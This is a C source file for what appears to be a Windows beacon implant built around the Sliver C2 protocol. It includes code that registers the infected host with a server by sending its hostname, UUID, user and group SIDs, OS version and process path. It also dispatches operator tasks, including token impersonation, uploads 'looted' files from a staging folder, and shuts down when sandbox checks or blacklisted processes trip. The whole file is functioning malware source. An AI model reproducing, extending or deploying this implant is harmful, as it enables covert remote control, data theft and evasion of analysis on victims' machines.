#include "pch.h"

PBEACON_TASK UnmarshalBeaconTasks
(
	_In_ PENVELOPE pEnvelope
)
{
	LPVOID* pUnmarshaledData = NULL;
	LPVOID* pUnmarshaledEnvelope = NULL;
	PPBElement RecvElements[3];
	PPBElement EnvelopeElements[4];
	DWORD i = 0;
	PBEACON_TASK pResult = NULL;
	PBUFFER* BufferList = NULL;
	DWORD dwNumberOfEnvelopes = 0;

	for (i = 0; i < _countof(RecvElements); i++) {
		RecvElements[i] = ALLOC(sizeof(PBElement));
		RecvElements[i]->dwFieldIdx = i + 1;
	}

	for (i = 0; i < _countof(EnvelopeElements); i++) {
		EnvelopeElements[i] = ALLOC(sizeof(PBElement));
		EnvelopeElements[i]->dwFieldIdx = i + 1;
		EnvelopeElements[i]->Type = Varint;
	}

	RecvElements[0]->Type = Bytes;
	RecvElements[1]->Type = RepeatedBytes;
	RecvElements[2]->Type = Varint;
	EnvelopeElements[2]->Type = Bytes;

	pUnmarshaledData = UnmarshalStruct(RecvElements, _countof(RecvElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	pResult = ALLOC(sizeof(BEACON_TASK));
	/*pResult->lpInstanceID = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
	pResult->dwNextCheckin = ((PUINT64)pUnmarshaledData)[2];*/
	BufferList = (PBUFFER*)pUnmarshaledData[1];
	dwNumberOfEnvelopes = *((PUINT64)BufferList);
	
	pResult->EnvelopeList = ALLOC(dwNumberOfEnvelopes * sizeof(PENVELOPE));
	pResult->dwNumberOfEnvelopes = dwNumberOfEnvelopes;
	for (i = 0; i < dwNumberOfEnvelopes; i++) {
		pResult->EnvelopeList[i] = ALLOC(sizeof(ENVELOPE));
		pUnmarshaledEnvelope = UnmarshalStruct(EnvelopeElements, _countof(EnvelopeElements), BufferList[i + 1]->pBuffer, BufferList[i + 1]->cbBuffer, NULL);
		pResult->EnvelopeList[i]->uID = (UINT64)pUnmarshaledEnvelope[0];
		pResult->EnvelopeList[i]->uType = (UINT64)pUnmarshaledEnvelope[1];
		pResult->EnvelopeList[i]->uUnknownMessageType = (UINT64)pUnmarshaledEnvelope[3];
		pResult->EnvelopeList[i]->pData = (PBUFFER)pUnmarshaledEnvelope[2];
		pUnmarshaledEnvelope[2] = NULL;
		FREE(pUnmarshaledEnvelope);
	}

CLEANUP:
	if (pUnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)pUnmarshaledData[0]);
		if (BufferList != NULL) {
			for (i = 1; i <= dwNumberOfEnvelopes; i++) {
				FreeBuffer(BufferList[i]);
			}

			FREE(BufferList);
		}
		
		FREE(pUnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElements); i++) {
		FREE(RecvElements[i]);
	}

	for (i = 0; i < _countof(EnvelopeElements); i++) {
		FREE(EnvelopeElements[i]);
	}

	return pResult;
}

PENVELOPE MarshalBeaconTasks
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon,
	_In_ DWORD dwNextCheckin,
	_In_ PENVELOPE* pTasksResult,
	_In_ DWORD dwNumberOfTasks
)
{
	PENVELOPE pResult = NULL;
	PPBElement BeaconTasksElements[3];
	PPBElement pFinalElement = NULL;
	PBUFFER* MarshaledTasks = NULL;
	DWORD i = 0;

	SecureZeroMemory(BeaconTasksElements, sizeof(BeaconTasksElements));
	BeaconTasksElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon->szInstanceID), 1);
	if (dwNextCheckin > 0) {
		BeaconTasksElements[2] = CreateVarIntElement(dwNextCheckin, 3);
	}

	if (pTasksResult != NULL) {
		MarshaledTasks = ALLOC(sizeof(PBUFFER) * dwNumberOfTasks);
		for (i = 0; i < dwNumberOfTasks; i++) {
			MarshaledTasks[i] = MarshalEnvelope(pTasksResult[i]);
		}

		BeaconTasksElements[1] = CreateRepeatedBytesElement(MarshaledTasks, dwNumberOfTasks, 2);
	}
	
	pFinalElement = CreateStructElement(BeaconTasksElements, _countof(BeaconTasksElements), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uType = MsgBeaconTasks;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FREE(MarshaledTasks);
	FreeElement(pFinalElement);

	return pResult;
}

DWORD GetNextCheckin
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	DWORD dwResult = 0;

	dwResult = pBeacon->dwInterval + GenRandomNumber32(0, pBeacon->dwJitter);
	return dwResult;
}

BOOL BeaconRegister
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	BOOL Result = FALSE;
	CHAR szOsName[] = "windows";
	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];
	PPBElement BeaconRegElements[5];
	ENVELOPE RegisterEnvelope;

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	SecureZeroMemory(ElementList, sizeof(ElementList));
	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LOG_ERROR("GetOsVersion", GetLastError());
		goto CLEANUP;
	}

	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
	lpLocaleName = ConvertWcharToChar(wszLocale);

	ElementList[0] = CreateBytesElement(pBeacon->pGlobalConfig->lpSliverName, lstrlenA(pBeacon->pGlobalConfig->lpSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pBeacon->pGlobalConfig->dwReconnectInterval, 13);

	ElementList[14] = CreateBytesElement(pBeacon->pGlobalConfig->lpConfigID, lstrlenA(pBeacon->pGlobalConfig->lpConfigID), 16);
	ElementList[15] = CreateVarIntElement(pBeacon->pGlobalConfig->uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
	
	BeaconRegElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon->szInstanceID), 1);
	BeaconRegElements[1] = CreateVarIntElement(pBeacon->dwInterval, 2);
	BeaconRegElements[2] = CreateVarIntElement(pBeacon->dwJitter, 3);
	BeaconRegElements[3] = CreateStructElement(ElementList, _countof(ElementList), 4);
	BeaconRegElements[4] = CreateVarIntElement(GetNextCheckin(pBeacon), 5);

	pFinalElement = CreateStructElement(BeaconRegElements, _countof(BeaconRegElements), 0);
	RegisterEnvelope.uType = MsgBeaconRegister;
	RegisterEnvelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
	Result = pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, &RegisterEnvelope);
CLEANUP:
	FREE(lpHostName);
	FREE(lpUUID);
	FREE(lpFullQualifiedName);
	FREE(lpUserSid);
	FREE(lpGroupSid);
	FREE(lpArch);
	FREE(lpModulePath);
	FREE(lpVersion);
	FREE(lpLocaleName);
	FreeElement(pFinalElement);

	return Result;
}

PENVELOPE* BeaconHandleTaskList
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon,
	_In_ PENVELOPE* Tasks,
	_In_ DWORD dwNumberOfTasks
)
{
	DWORD i = 0;
	REQUEST_HANDLER ReqHandler = NULL;
	REQUEST_HANDLER* HandlerTable = NULL;
	PENVELOPE* pResult = NULL;
	WCHAR wszLogName[MAX_PATH];
	LPSTR lpError = NULL;
	PENVELOPE pRespEnvelope = NULL;
	UINT64 uType = 0;

	pResult = ALLOC(sizeof(PENVELOPE) * dwNumberOfTasks);
	HandlerTable = GetSystemHandler();

	for (i = 0; i < dwNumberOfTasks; i++) {
#ifdef _FULL
		uType = Tasks[i]->uType;
		if (uType == MsgMakeTokenReq || uType == MsgRevToSelf || uType == MsgImpersonateReq) {
			pResult[i] = Tasks[i];
			Tasks[i] = NULL;
		}
#endif

		ReqHandler = HandlerTable[Tasks[i]->uType];
		if (ReqHandler != NULL) {
			SecureZeroMemory(wszLogName, sizeof(wszLogName));
			GetTempPathW(_countof(wszLogName), wszLogName);
			wsprintfW(&wszLogName[lstrlenW(wszLogName)], L"log_%d.txt", GetCurrentThreadId());
			CreateEmptyFileW(wszLogName);
			pRespEnvelope = ReqHandler(Tasks[i], pBeacon);
			if (pRespEnvelope == NULL) {
				lpError = ReadFromFile(wszLogName, NULL);
				if (lpError != NULL && lstrlenA(lpError) > 0) {
					pRespEnvelope = CreateErrorRespEnvelope(lpError, 9, Tasks[i]->uID);
				}
				else {
					pRespEnvelope = CreateErrorRespEnvelope("Failed to execute command (Unknown Error)", 9, Tasks[i]->uID);
				}

				FREE(lpError);
			}

			DeleteFileW(wszLogName);
			pResult[i] = pRespEnvelope;
			continue;
		}

		// Cac handler con lai
UNKNOWN_TYPE:
		pResult[i] = ALLOC(sizeof(ENVELOPE));
		pResult[i]->uID = Tasks[i]->uID;
		pResult[i]->uUnknownMessageType = 1;
	}

	FREE(HandlerTable);

	return pResult;
}

VOID FreeBeaconTask
(
	_In_ PBEACON_TASK pBeaconTask
)
{
	DWORD i = 0;

	if (pBeaconTask != NULL) {
		FREE(pBeaconTask->lpInstanceID);
		if (pBeaconTask->EnvelopeList != NULL) {
			for (i = 0; i < pBeaconTask->dwNumberOfEnvelopes; i++) {
				FreeEnvelope(pBeaconTask->EnvelopeList[i]);
			}

			FREE(pBeaconTask->EnvelopeList);
		}
		
		FREE(pBeaconTask);
	}
}

VOID FreeBeaconClient
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	if (pBeacon != NULL) {
		if (pBeacon->lpClient != NULL) {
			pBeacon->Close(pBeacon->lpClient);
			FREE(pBeacon->lpClient);
		}

		FreeGlobalConfig(pBeacon->pGlobalConfig);
		FREE(pBeacon);
	}
}

VOID BeaconWork
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PBEACON_TASKS_WRAPPER pWrapper,
	_Inout_ PTP_WORK Work
)
{
	PENVELOPE pSendEnvelope = NULL;
	PENVELOPE pTempEnvelope = NULL;
	PENVELOPE* TaskResults = NULL;
	PSLIVER_BEACON_CLIENT pBeacon;
	DWORD i = 0;
	DWORD dwOldInterval = 0;
	PGLOBAL_CONFIG pConfig = NULL;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATAW FindData;
	LPWSTR lpMask = NULL;
	LPWSTR lpClonedPath = NULL;

	pBeacon = pWrapper->pBeacon;
	pConfig = pBeacon->pGlobalConfig;
	if (pWrapper->pTaskList != NULL && pWrapper->dwNumberOfTasks > 0) {
		TaskResults = BeaconHandleTaskList(pBeacon, pWrapper->pTaskList, pWrapper->dwNumberOfTasks);
		for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
			FreeEnvelope(pWrapper->pTaskList[i]);
		}
	}

	if (pConfig->Loot) {
		SecureZeroMemory(&FindData, sizeof(FindData));
		lpMask = DuplicateStrW(pConfig->wszWarehouse, 2);
		lstrcatW(lpMask, L"\\*");
		hFind = FindFirstFileW(lpMask, &FindData);
		if (hFind != INVALID_HANDLE_VALUE) {
			do {
				if (i > 10) {
					break;
				}

				lpClonedPath = DuplicateStrW(pConfig->wszWarehouse, lstrlenW(FindData.cFileName) + 1);
				lstrcatW(lpClonedPath, L"\\");
				lstrcatW(lpClonedPath, FindData.cFileName);
				pTempEnvelope = MarshalLootedFile(lpClonedPath);
				if (pTempEnvelope != NULL) {
					if (TaskResults == NULL) {
						TaskResults = ALLOC(sizeof(PENVELOPE));
					}
					else {
						TaskResults = REALLOC(TaskResults, sizeof(PENVELOPE) * (pWrapper->dwNumberOfTasks + 1));
					}

#ifdef _DEBUG
					PrintFormatA("Write Envelope:\n");
					HexDump(pTempEnvelope->pData->pBuffer, pTempEnvelope->pData->cbBuffer);
#endif

					TaskResults[pWrapper->dwNumberOfTasks++] = pTempEnvelope;
					i++;
				}

				FREE(lpClonedPath);
			} while (FindNextFileW(hFind, &FindData));
			FindClose(hFind);
		}
	}

	dwOldInterval = pBeacon->dwInterval;
	pSendEnvelope = MarshalBeaconTasks(pBeacon, 0, TaskResults, pWrapper->dwNumberOfTasks);
	pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pSendEnvelope);
CLEANUP:
	FreeEnvelope(pSendEnvelope);
	for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
		FreeEnvelope(TaskResults[i]);
	}

	FREE(lpMask);
	FREE(TaskResults);
	FREE(pWrapper->pTaskList);
	if (dwOldInterval != pBeacon->dwInterval) {
		SetEvent(pWrapper->hEvent);
	}

	FREE(pWrapper);
	return;
}

VOID BeaconMainLoop
(
	_In_ PSLIVER_BEACON_CLIENT pBeacon
)
{
	DWORD i = 0;
	DWORD j = 0;
	PENVELOPE pNextCheckinEnvelope = NULL;
	PENVELOPE pRecvEnvelope = NULL;
	PBEACON_TASK BeaconTask = NULL;
	PSLIVER_THREADPOOL pSliverPool = NULL;
	PTP_WORK pWork = NULL;
	DWORD dwNumberOfAttempts = 0;
	PBEACON_TASKS_WRAPPER pWrapper = NULL;
	HANDLE hEvent = NULL;
	PGLOBAL_CONFIG pConfig = pBeacon->pGlobalConfig;
	LPVOID* ProfileList = NULL;
	DWORD cProfiles = 0;
	WCHAR wszLogName[MAX_PATH];
	PENVELOPE pReturnedEnvelope = NULL;
	LPSTR lpError = NULL;
	UINT64 uType = 0;
	DWORD dwThreadID = 0;

	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	pSliverPool = InitializeSliverThreadPool();
	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	if (pConfig->Protocol == Http) {
		ProfileList = pConfig->HttpProfiles;
		cProfiles = pConfig->cHttpProfiles;
	}
	else if (pConfig->Protocol == Drive) {
		ProfileList = pConfig->DriveProfiles;
		cProfiles = pConfig->cDriveProfiles;
	}
	else if (pConfig->Type == Pivot) {
		ProfileList = pConfig->PivotProfiles;
		cProfiles = pConfig->cPivotProfiles;
	}
	else {
		goto CLEANUP;
	}

	for (i = 0; i < cProfiles; i++) {
		pBeacon->lpClient = pBeacon->Init(pConfig, ProfileList[i]);
#ifndef _DEBUG
		if (DetectSandbox2() || DetectSandbox3()) {
			goto CLEANUP;
		}
#endif

		if (!pBeacon->Start(pBeacon->lpClient)) {
			goto CONTINUE;
		}

		if (!BeaconRegister(pBeacon)) {
			goto CONTINUE;
		}

		break;
CONTINUE:
		pBeacon->Close(pBeacon->lpClient);
		pBeacon->Cleanup(pBeacon->lpClient);
		pBeacon->lpClient = NULL;
	}

	if (pBeacon->lpClient == NULL) {
		goto CLEANUP;
	}

	dwNumberOfAttempts = 0;
	while (TRUE) {
#ifndef _DEBUG
		if (DetectSandbox1() || DetectSandbox2() || CheckForBlackListProcess()) {
			goto CLEANUP;
		}
#endif
		if (dwNumberOfAttempts >= pConfig->dwMaxConnectionErrors) {
			goto CLEANUP;
		}

		pNextCheckinEnvelope = MarshalBeaconTasks(pBeacon, GetNextCheckin(pBeacon), NULL, 0);
		if (!pBeacon->Send(pConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
			FreeEnvelope(pNextCheckinEnvelope);
			dwNumberOfAttempts++;
			goto SLEEP;
		}

		dwNumberOfAttempts = 0;
		FreeEnvelope(pNextCheckinEnvelope);
		pRecvEnvelope = pBeacon->Receive(pConfig, pBeacon->lpClient);
		if (pRecvEnvelope != NULL && pRecvEnvelope->pData != NULL) {
			BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);

			pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
			pWrapper->pTaskList = BeaconTask->EnvelopeList;
			pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
#ifdef _FULL
			for (j = 0; j < pWrapper->dwNumberOfTasks; j++) {
				uType = pWrapper->pTaskList[j]->uType;
				if (uType == MsgMakeTokenReq || uType == MsgRevToSelf || uType == MsgImpersonateReq) {
					SecureZeroMemory(wszLogName, sizeof(wszLogName));
					GetTempPathW(_countof(wszLogName), wszLogName);
					wsprintfW(&wszLogName[lstrlenW(wszLogName)], L"log_%d.txt", GetCurrentThreadId());
					CreateEmptyFileW(wszLogName);
					if (uType == MsgMakeTokenReq) {
						pReturnedEnvelope = MakeTokenHandler(pWrapper->pTaskList[j], pBeacon);
					}
					else if (uType == MsgRevToSelf) {
						pReturnedEnvelope = RevToSelfHandler(pWrapper->pTaskList[j], pBeacon);
					}
					else if (uType == MsgImpersonateReq) {
						pReturnedEnvelope = ImpersonateHandler(pWrapper->pTaskList[j], pBeacon);
					}

					if (pReturnedEnvelope == NULL) {
						lpError = ReadFromFile(wszLogName, NULL);
						if (lpError != NULL && lstrlenA(lpError) > 0) {
							pReturnedEnvelope = CreateErrorRespEnvelope(lpError, 9, pRecvEnvelope->uID);
						}
						else {
							pReturnedEnvelope = CreateErrorRespEnvelope("Failed to execute command (Unknown Error)", 9, pRecvEnvelope->uID);
						}

						FREE(lpError);
					}

					pReturnedEnvelope->uType = uType;
					pWrapper->pTaskList[j] = pReturnedEnvelope;
					DeleteFileW(wszLogName);
				}
			}
#endif

			pWrapper->hEvent = hEvent;
			pWrapper->pBeacon = pBeacon;
			FREE(BeaconTask->lpInstanceID);
			FREE(BeaconTask);
			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
			TpPostWork(pWork);
		}
		else if (pConfig->Loot) {
			pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
			pWrapper->hEvent = hEvent;
			pWrapper->pBeacon = pBeacon;
			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
			TpPostWork(pWork);
		}

		FreeEnvelope(pRecvEnvelope);
	SLEEP:
		WaitForSingleObject(hEvent, GetNextCheckin(pBeacon) * 1000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);
	if (pBeacon->lpClient != NULL) {
		pBeacon->Close(pBeacon->lpClient);
		pBeacon->Cleanup(pBeacon->lpClient);
		pBeacon->lpClient = NULL;
	}

	if (hEvent != NULL) {
		CloseHandle(hEvent);
	}
}

PSLIVER_BEACON_CLIENT BeaconInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_BEACON_CLIENT pBeacon = NULL;
	DWORD dwInterval = 180;
	DWORD dwJitter = 20;
	LPSTR lpUuid = NULL;

	pBeacon = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	pBeacon->pGlobalConfig = pGlobalConfig;
	pBeacon->dwInterval = dwInterval;
	pBeacon->dwJitter = dwJitter;
	lpUuid = GenerateUUIDv4();
	lstrcpyA(pBeacon->szInstanceID, lpUuid);
	
	if (pGlobalConfig->Protocol == Drive) {
		pBeacon->Init = (CLIENT_INIT)DriveInit;
		pBeacon->Start = (CLIENT_START)DriveStart;
		pBeacon->Send = (SEND_ENVELOPE)DriveSend;
		pBeacon->Receive = (RECV_ENVELOPE)DriveRecv;
		pBeacon->Close = (CLIENT_CLOSE)DriveClose;
		pBeacon->Cleanup = (CLIENT_CLEANUP)FreeDriveClient;
	}
	else if (pGlobalConfig->Protocol == Http) {
		pBeacon->Init = (CLIENT_INIT)HttpInit;
		pBeacon->Start = (CLIENT_START)HttpStart;
		pBeacon->Send = (SEND_ENVELOPE)HttpSend;
		pBeacon->Receive = (RECV_ENVELOPE)HttpRecv;
		pBeacon->Close = (CLIENT_CLOSE)HttpClose;
		pBeacon->Cleanup = (CLIENT_CLEANUP)HttpCleanup;
	}
	/*else if (pGlobalConfig->Protocol == Tcp) {
		pBeacon->Init = (CLIENT_INIT)TcpInit;
		pBeacon->Start = TcpStart;
		pBeacon->Send = TcpSend;
		pBeacon->Receive = TcpRecv;
		pBeacon->Close = TcpClose;
		pBeacon->Cleanup = TcpCleanup;
	}
	else if (pGlobalConfig->Protocol == NamedPipe) {
		pBeacon->Init = (CLIENT_INIT)PipeInit;
		pBeacon->Start = PipeStart;
		pBeacon->Send = PipeSend;
		pBeacon->Receive = PipeRecv;
		pBeacon->Close = PipeClose;
		pBeacon->Cleanup = PipeCleanup;
	}*/
	else {
		FREE(pBeacon);
		pBeacon = NULL;
		goto CLEANUP;
	}
	
CLEANUP:
	FREE(lpUuid);

	return pBeacon;
}